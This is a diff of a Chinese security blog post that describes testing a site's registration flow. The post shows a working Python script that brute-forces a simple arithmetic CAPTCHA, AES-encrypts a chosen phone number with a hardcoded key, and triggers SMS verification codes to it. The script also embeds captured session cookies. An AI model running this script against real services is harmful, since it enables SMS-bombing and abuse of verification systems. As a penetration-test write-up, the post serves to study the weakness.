@@ -8,23 +8,23 @@
   <link rel="dns-prefetch" href="https://doggy-test.github.io">
   <title>遍历手机号发送短信验证码 | Doggy的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="好久没更新了，之前放在七牛云上的图片因为临时域名的原因也挂了，把他导出来放在腾讯云图床了。另外几张图片放在了不知名小地方，现在已经找不回了==  朋友丢过来一个站点，让帮忙测下是否有安全问题，其中注册那个地方有点意思，就记录一下  注册页面是这样的，存在以下3步  发送图形验证码 校验验证码是否正确 发送短信验证码">
+  <meta name="description" content="好久没更新了，之前放在七牛云上的图片因为临时域名的原因也挂了，把他导出来放在腾讯云图床了。另外几张图片放在了不知名小地方，现在已经找不回了  朋友丢过来一个站点，让帮忙测下是否有安全问题，其中注册那个地方有点ctf题目的意思，就记录一下  注册页面是这样的，存在以下3步  发送图形验证码 校验验证码是否正确 发送短信验证码">
 <meta name="keywords" content="渗透测试">
 <meta property="og:type" content="article">
 <meta property="og:title" content="遍历手机号发送短信验证码">
 <meta property="og:url" content="https://doggy-test.github.io/2019/07/17/遍历手机号发送短信验证码/index.html">
 <meta property="og:site_name" content="Doggy的博客">
-<meta property="og:description" content="好久没更新了，之前放在七牛云上的图片因为临时域名的原因也挂了，把他导出来放在腾讯云图床了。另外几张图片放在了不知名小地方，现在已经找不回了==  朋友丢过来一个站点，让帮忙测下是否有安全问题，其中注册那个地方有点意思，就记录一下  注册页面是这样的，存在以下3步  发送图形验证码 校验验证码是否正确 发送短信验证码">
+<meta property="og:description" content="好久没更新了，之前放在七牛云上的图片因为临时域名的原因也挂了，把他导出来放在腾讯云图床了。另外几张图片放在了不知名小地方，现在已经找不回了  朋友丢过来一个站点，让帮忙测下是否有安全问题，其中注册那个地方有点ctf题目的意思，就记录一下  注册页面是这样的，存在以下3步  发送图形验证码 校验验证码是否正确 发送短信验证码">
 <meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/QQ20190717-112135%402x.png">
 <meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/QQ20190717-112340%402x.png">
 <meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/QQ20190717-152027%402x.png">
 <meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/QQ20190717-172529%402x.png">
 <meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/QQ20190717-172801%402x.png">
 <meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/QQ20190717-153525%402x.png">
-<meta property="og:updated_time" content="2019-07-17T09:30:19.707Z">
+<meta property="og:updated_time" content="2019-07-18T04:06:31.660Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="遍历手机号发送短信验证码">
-<meta name="twitter:description" content="好久没更新了，之前放在七牛云上的图片因为临时域名的原因也挂了，把他导出来放在腾讯云图床了。另外几张图片放在了不知名小地方，现在已经找不回了==  朋友丢过来一个站点，让帮忙测下是否有安全问题，其中注册那个地方有点意思，就记录一下  注册页面是这样的，存在以下3步  发送图形验证码 校验验证码是否正确 发送短信验证码">
+<meta name="twitter:description" content="好久没更新了，之前放在七牛云上的图片因为临时域名的原因也挂了，把他导出来放在腾讯云图床了。另外几张图片放在了不知名小地方，现在已经找不回了  朋友丢过来一个站点，让帮忙测下是否有安全问题，其中注册那个地方有点ctf题目的意思，就记录一下  注册页面是这样的，存在以下3步  发送图形验证码 校验验证码是否正确 发送短信验证码">
 <meta name="twitter:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/QQ20190717-112135%402x.png">
   
     <link rel="alternative" href="/atom.xml" title="Doggy的博客" type="application/atom+xml">
@@ -173,9 +173,9 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>好久没更新了，之前放在七牛云上的图片因为临时域名的原因也挂了，把他导出来放在腾讯云图床了。另外几张图片放在了不知名小地方，现在已经找不回了==</p>
+        <p>好久没更新了，之前放在七牛云上的图片因为临时域名的原因也挂了，把他导出来放在腾讯云图床了。另外几张图片放在了不知名小地方，现在已经找不回了</p>
 <blockquote>
-<p>朋友丢过来一个站点，让帮忙测下是否有安全问题，其中注册那个地方有点意思，就记录一下</p>
+<p>朋友丢过来一个站点，让帮忙测下是否有安全问题，其中注册那个地方有点ctf题目的意思，就记录一下</p>
 </blockquote>
 <p>注册页面是这样的，存在以下3步</p>
 <ol>
@@ -184,9 +184,9 @@
 <li>发送短信验证码</li>
 </ol>
 <a id="more"></a>
-<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/QQ20190717-112135%402x.png" alt=""></p>
+<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/QQ20190717-112135%402x.png" alt="image"></p>
 <p>验证码长这样</p>
-<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/QQ20190717-112340%402x.png" alt=""></p>
+<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/QQ20190717-112340%402x.png" alt="image"></p>
 <p>试了几次，都是非常简单的问题，诸如1+1，3*3之类</p>
 <p>根据多年搬砖经验，这里可能存在以下安全问题</p>
 <ol>
@@ -202,13 +202,13 @@
 <p>因此，可以通过以下步骤，遍历手机号发送验证码</p>
 <ol>
 <li>发起获取图形验证码请求</li>
-<li>爆破图形验证码</li>
+<li>由于验证码问题简单，所以我设置了在-5-20的区间爆破图形验证码</li>
 <li>构造手机号发起发送短信验证码请求</li>
 </ol>
 <p>python脚本如下<br>踩了个坑，padding值如果不一致，aes结果也会有区别，下次要注意<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#encoding=UTF-8</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">EncryptDate</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.key = <span class="string">"0102030405060708"</span>  <span class="comment"># 初始化密钥</span></div><div class="line">        self.length = AES.block_size  <span class="comment"># 初始化数据块大小</span></div><div class="line">        self.iv = <span class="string">"0102030405060708"</span></div><div class="line">        self.aes = AES.new(self.key, AES.MODE_ECB,self.iv)  <span class="comment"># 初始化AES,ECB模式的实例</span></div><div class="line">        <span class="comment"># 截断函数，去除填充的字符</span></div><div class="line">        self.unpad = <span class="keyword">lambda</span> date: date[<span class="number">0</span>:-ord(date[<span class="number">-1</span>])]</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(self, text)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        #填充函数，使被加密数据的字节码长度是block_size的整数倍</div><div class="line">        """</div><div class="line">        count = len(text.encode(<span class="string">'utf-8'</span>))</div><div class="line">        add = self.length - (count % self.length)</div><div class="line">        entext = text + (chr(add) * add)</div><div class="line">        <span class="keyword">return</span> entext</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, encrData)</span>:</span>  <span class="comment"># 加密函数</span></div><div class="line">        res = self.aes.encrypt(self.pad(encrData).encode(<span class="string">"utf8"</span>))</div><div class="line">        msg = base64.b64encode(res)</div><div class="line">        <span class="keyword">return</span> msg</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, decrData)</span>:</span>  <span class="comment"># 解密函数</span></div><div class="line">        res = base64.decodebytes(decrData.encode(<span class="string">"utf8"</span>))</div><div class="line">        msg = self.aes.decrypt(res).decode(<span class="string">"utf8"</span>)</div><div class="line">        <span class="keyword">return</span> self.unpad(msg)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span> :</div><div class="line">    mobile = raw_input(<span class="string">"please input the mobile:"</span>)</div><div class="line">    headers1 = &#123;</div><div class="line">        <span class="string">"cookie"</span>:<span class="string">"__s_f_c_s_=A3EF9A409302284A99E5EA734AD4513A; Hm_lvt_8f9c28b1974aab0cc64aba339f45e783=1563265273; Hm_lpvt_8f9c28b1974aab0cc64aba339f45e783=1563265273; Hm_lvt_33846fe064fdf7896aa5d81e3470d7ff=1563266401; UM_distinctid=16bf9f041e6de-03a2b5c82ed71f-3a65420e-1aeaa0-16bf9f041e7582; __d_s_=A3FA4DC22607DB734F4623F82636FA9C; Hm_lpvt_33846fe064fdf7896aa5d81e3470d7ff=1563343892; JSESSIONID=F68E4E88B2CE9E09CF53DAE54B48CC32"</span></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    headers2 = &#123;</div><div class="line">        <span class="string">"cookie"</span>:<span class="string">"__s_f_c_s_=A3EF9A409302284A99E5EA734AD4513A; Hm_lvt_8f9c28b1974aab0cc64aba339f45e783=1563265273; Hm_lpvt_8f9c28b1974aab0cc64aba339f45e783=1563265273; Hm_lvt_33846fe064fdf7896aa5d81e3470d7ff=1563266401; UM_distinctid=16bf9f041e6de-03a2b5c82ed71f-3a65420e-1aeaa0-16bf9f041e7582; __d_s_=A3FA4DC22607DB734F4623F82636FA9C; Hm_lpvt_33846fe064fdf7896aa5d81e3470d7ff=1563343892; CNZZDATA1260003247=218666546-1563266404-null%7C1563343898; JSESSIONID=D17C82584E2B7EBB709B59AFC1D38A2A"</span></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    headers3 = &#123;</div><div class="line">        <span class="string">"cookie"</span>:<span class="string">"__s_f_c_s_=A3EF9A409302284A99E5EA734AD4513A; Hm_lvt_8f9c28b1974aab0cc64aba339f45e783=1563265273; Hm_lpvt_8f9c28b1974aab0cc64aba339f45e783=1563265273; Hm_lvt_33846fe064fdf7896aa5d81e3470d7ff=1563266401; UM_distinctid=16bf9f041e6de-03a2b5c82ed71f-3a65420e-1aeaa0-16bf9f041e7582; __d_s_=A3FA4DC22607DB734F4623F82636FA9C; Hm_lpvt_33846fe064fdf7896aa5d81e3470d7ff=1563343892; CNZZDATA1260003247=218666546-1563266404-null%7C1563343898; JSESSIONID=D17C82584E2B7EBB709B59AFC1D38A2A"</span></div><div class="line">    &#125;</div><div class="line">    get_img_url = <span class="string">"http://xxxx.com.cn/imageVerifyCodeServlet?action=image&amp;t=1563331117584"</span></div><div class="line"></div><div class="line"></div><div class="line">    r1= requests.get(get_img_url,headers=headers1)</div><div class="line"></div><div class="line"></div><div class="line">    brute_img_url = <span class="string">"http://xxx.com.cn/register/person/checkVerifyCodeForSms"</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">-5</span>,<span class="number">20</span>):</div><div class="line">        data  = &#123;<span class="string">"securityCode"</span>:str(i)&#125;</div><div class="line">        r2 = requests.post(brute_img_url,headers=headers2,data=data)</div><div class="line"></div><div class="line">    encryptdatta = EncryptDate()</div><div class="line"></div><div class="line">    res = quote(encryptdatta.encrypt(mobile))</div><div class="line"></div><div class="line">    sendcode_url = <span class="string">"http://xxxx.com.cn/register/person/sendAuthCode?loginAccount="</span>+res+<span class="string">"&amp;way="</span>+res+<span class="string">"&amp;_=1563266398865"</span></div><div class="line"></div><div class="line">    <span class="keyword">print</span> requests.get(sendcode_url,headers=headers3).text</div></pre></td></tr></table></figure></p>
 <p>结果如下</p>
 <p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/QQ20190717-153525%402x.png" alt=""></p>
-<p>还不错，虽然放到src只能值20元，哈哈～～</p>
+<p>还不错，最后一个估计是题目答案超出预设值了。</p>
 
       
 
@@ -422,7 +422,7 @@
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
+                <a href="javascript:void(0)" class="js-tag color3">笔记</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -430,15 +430,15 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">数据结构</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">writeup</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">笔记</a>
+                <a href="javascript:void(0)" class="js-tag color5">数据结构</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
               </li>
              
               <li class="article-tag-list-item">
